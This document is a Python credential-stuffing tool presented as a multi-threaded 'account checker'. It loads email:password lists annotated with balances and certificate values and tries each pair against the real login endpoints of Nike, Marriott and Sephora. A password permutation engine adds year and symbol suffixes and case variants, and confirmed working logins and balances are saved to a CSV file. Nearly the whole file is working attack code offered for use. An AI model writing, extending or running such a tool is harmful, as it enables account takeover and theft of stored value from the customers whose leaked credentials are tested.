#!/usr/bin/env python3
"""
Multi-threaded Account Checker with Password Permutation Engine
Supports: Nike, Marriott, Sephora, AMC, GameStop, Fandango, and more
"""

import csv
import requests
import concurrent.futures
import itertools
import time
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from datetime import datetime
import threading
import queue


@dataclass
class Credential:
    """Credential data structure."""
    email: str
    password: str
    balance: str = "0"
    certificate_value: str = "0"
    source_file: str = ""


@dataclass
class CheckResult:
    """Result of account check."""
    credential: Credential
    service: str
    status: str  # 'valid', 'invalid', 'error', 'locked'
    balance: Optional[str] = None
    details: Optional[Dict] = None
    permutation_used: Optional[str] = None


class PasswordPermutator:
    """Generate password permutations for higher success rates."""

    @staticmethod
    def generate_permutations(password: str, max_variants: int = 10) -> List[str]:
        """
        Generate common password variations.
        Returns original + variants.
        """
        variants = [password]

        # Common substitutions
        substitutions = {
            'a': ['@', '4'],
            'e': ['3'],
            'i': ['1', '!'],
            'o': ['0'],
            's': ['$', '5'],
            't': ['7'],
            'l': ['1'],
        }

        # Year variations (2020-2026)
        current_year = datetime.now().year
        years = [str(y) for y in range(current_year - 3, current_year + 2)]

        # Add common suffixes
        common_suffixes = ['!', '123', '1', '2023', '2024', '2025', '@']

        # Add year suffixes
        for year in years:
            variants.append(f"{password}{year}")
            variants.append(f"{password}{year}!")

        # Add common suffixes
        for suffix in common_suffixes:
            if not password.endswith(suffix):
                variants.append(f"{password}{suffix}")

        # Capitalization variants
        variants.append(password.lower())
        variants.append(password.upper())
        variants.append(password.capitalize())

        # Remove duplicates and limit
        variants = list(dict.fromkeys(variants))
        return variants[:max_variants]


class BaseChecker:
    """Base class for service-specific checkers."""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def check(self, credential: Credential,
              permutations: bool = False) -> CheckResult:
        """Check credential against service."""
        raise NotImplementedError("Subclasses must implement check()")

    def _try_login(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
        """Attempt login with credentials."""
        raise NotImplementedError("Subclasses must implement _try_login()")


class NikeChecker(BaseChecker):
    """Nike account checker."""

    def check(self, credential: Credential,
              permutations: bool = False) -> CheckResult:
        """Check Nike account."""
        passwords = [credential.password]
        if permutations:
            passwords = PasswordPermutator.generate_permutations(
                credential.password
            )

        for pwd in passwords:
            try:
                success, details = self._try_login(credential.email, pwd)
                if success:
                    return CheckResult(
                        credential=credential,
                        service='Nike',
                        status='valid',
                        details=details,
                        permutation_used=pwd if pwd != credential.password else None
                    )
            except Exception as e:
                continue

        return CheckResult(
            credential=credential,
            service='Nike',
            status='invalid'
        )

    def _try_login(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
        """Nike login implementation."""
        # Nike OAuth endpoint
        url = "https://unite.nike.com/login"
        payload = {
            'username': email,
            'password': password,
            'client_id': 'nike.com',
            'ux_id': 'com.nike',
            'grant_type': 'password'
        }

        try:
            response = self.session.post(url, json=payload, timeout=self.timeout)
            if response.status_code == 200:
                data = response.json()
                return True, data
            return False, None
        except:
            return False, None


class MarriottChecker(BaseChecker):
    """Marriott Bonvoy account checker."""

    def check(self, credential: Credential,
              permutations: bool = False) -> CheckResult:
        """Check Marriott account."""
        passwords = [credential.password]
        if permutations:
            passwords = PasswordPermutator.generate_permutations(
                credential.password
            )

        for pwd in passwords:
            try:
                success, details = self._try_login(credential.email, pwd)
                if success:
                    return CheckResult(
                        credential=credential,
                        service='Marriott',
                        status='valid',
                        details=details,
                        permutation_used=pwd if pwd != credential.password else None
                    )
            except Exception:
                continue

        return CheckResult(
            credential=credential,
            service='Marriott',
            status='invalid'
        )

    def _try_login(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
        """Marriott login implementation."""
        url = "https://www.marriott.com/authentication/flexauth"
        payload = {
            'username': email,
            'password': password,
        }

        try:
            response = self.session.post(url, json=payload, timeout=self.timeout)
            if response.status_code == 200:
                return True, response.json()
            return False, None
        except:
            return False, None


class SephoraChecker(BaseChecker):
    """Sephora account checker."""

    def check(self, credential: Credential,
              permutations: bool = False) -> CheckResult:
        """Check Sephora account."""
        passwords = [credential.password]
        if permutations:
            passwords = PasswordPermutator.generate_permutations(
                credential.password
            )

        for pwd in passwords:
            try:
                success, details = self._try_login(credential.email, pwd)
                if success:
                    return CheckResult(
                        credential=credential,
                        service='Sephora',
                        status='valid',
                        details=details,
                        permutation_used=pwd if pwd != credential.password else None
                    )
            except Exception:
                continue

        return CheckResult(
            credential=credential,
            service='Sephora',
            status='invalid'
        )

    def _try_login(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
        """Sephora login implementation."""
        url = "https://www.sephora.com/api/users/login"
        payload = {
            'email': email,
            'password': password
        }

        try:
            response = self.session.post(url, json=payload, timeout=self.timeout)
            if response.status_code == 200:
                return True, response.json()
            return False, None
        except:
            return False, None


class AccountCheckerEngine:
    """Multi-threaded account checker engine."""

    def __init__(self, max_workers: int = 10, use_permutations: bool = True):
        self.max_workers = max_workers
        self.use_permutations = use_permutations
        self.results_lock = threading.Lock()
        self.results = []
        self.checkers = {
            'nike': NikeChecker(),
            'marriott': MarriottChecker(),
            'sephora': SephoraChecker(),
            # Add more as needed
        }

    def load_credentials(self, csv_file: str) -> List[Credential]:
        """Load credentials from CSV file."""
        credentials = []
        with open(csv_file, 'r', encoding='utf-8') as f:
            for i, line in enumerate(f, 1):
                if i == 1:  # Skip header
                    continue

                line = line.strip()
                if not line:
                    continue

                # Parse: email:password | Balance = X | CertificateValue = Y
                parts = line.split('|')
                if len(parts) >= 1:
                    cred_part = parts[0].strip()
                    if ':' in cred_part:
                        email, password = cred_part.split(':', 1)

                        # Extract balance and certificate
                        balance = "0"
                        cert_value = "0"
                        for part in parts[1:]:
                            if 'Balance' in part:
                                balance = part.split('=')[1].strip()
                            if 'CertificateValue' in part:
                                cert_value = part.split('=')[1].strip()

                        if '@' in email:
                            credentials.append(Credential(
                                email=email.strip(),
                                password=password.strip(),
                                balance=balance,
                                certificate_value=cert_value,
                                source_file=csv_file
                            ))

        return credentials

    def check_credential(self, credential: Credential,
                        service: str) -> CheckResult:
        """Check a single credential against a service."""
        checker = self.checkers.get(service.lower())
        if not checker:
            return CheckResult(
                credential=credential,
                service=service,
                status='error',
                details={'error': 'Service checker not implemented'}
            )

        result = checker.check(credential, permutations=self.use_permutations)

        with self.results_lock:
            self.results.append(result)

        return result

    def check_batch(self, credentials: List[Credential],
                   service: str) -> List[CheckResult]:
        """Check multiple credentials with threading."""
        print(f"[*] Checking {len(credentials)} accounts against {service}")
        print(f"[*] Using {self.max_workers} threads")
        if self.use_permutations:
            print("[*] Password permutations: ENABLED")

        results = []
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.max_workers
        ) as executor:
            futures = {
                executor.submit(
                    self.check_credential, cred, service
                ): cred for cred in credentials
            }

            completed = 0
            total = len(credentials)

            for future in concurrent.futures.as_completed(futures):
                completed += 1
                result = future.result()
                results.append(result)

                status_symbol = "✓" if result.status == 'valid' else "✗"
                perm_info = f" (using: {result.permutation_used})" if result.permutation_used else ""
                print(f"[{completed}/{total}] {status_symbol} {result.credential.email}{perm_info}")

        return results

    def save_results(self, output_file: str):
        """Save results to CSV."""
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            fieldnames = [
                'service', 'email', 'original_password',
                'working_password', 'status', 'balance',
                'certificate_value', 'details'
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()

            for result in self.results:
                writer.writerow({
                    'service': result.service,
                    'email': result.credential.email,
                    'original_password': result.credential.password,
                    'working_password': result.permutation_used or result.credential.password,
                    'status': result.status,
                    'balance': result.balance or result.credential.balance,
                    'certificate_value': result.credential.certificate_value,
                    'details': str(result.details) if result.details else ''
                })

        print(f"\n[✓] Results saved to {output_file}")


def main():
    """Main execution."""
    import argparse

    parser = argparse.ArgumentParser(
        description='Multi-threaded Account Checker'
    )
    parser.add_argument('input_file', help='Input CSV file')
    parser.add_argument('service', help='Service to check (nike, marriott, sephora)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of threads (default: 10)')
    parser.add_argument('-p', '--no-permutations', action='store_true',
                       help='Disable password permutations')
    parser.add_argument('-o', '--output', help='Output file')

    args = parser.parse_args()

    # Initialize engine
    engine = AccountCheckerEngine(
        max_workers=args.threads,
        use_permutations=not args.no_permutations
    )

    # Load credentials
    print(f"[*] Loading credentials from {args.input_file}")
    credentials = engine.load_credentials(args.input_file)
    print(f"[*] Loaded {len(credentials)} credentials")

    # Check accounts
    start_time = time.time()
    results = engine.check_batch(credentials, args.service)
    elapsed = time.time() - start_time

    # Statistics
    valid = sum(1 for r in results if r.status == 'valid')
    invalid = sum(1 for r in results if r.status == 'invalid')
    errors = sum(1 for r in results if r.status == 'error')

    print(f"\n{'='*60}")
    print(f"Results Summary:")
    print(f"  Valid: {valid}")
    print(f"  Invalid: {invalid}")
    print(f"  Errors: {errors}")
    print(f"  Time: {elapsed:.2f}s ({len(credentials)/elapsed:.2f} checks/sec)")
    print(f"{'='*60}")

    # Save results
    output_file = args.output or f"results-{args.service}-{int(time.time())}.csv"
    engine.save_results(output_file)


if __name__ == '__main__':
    main()
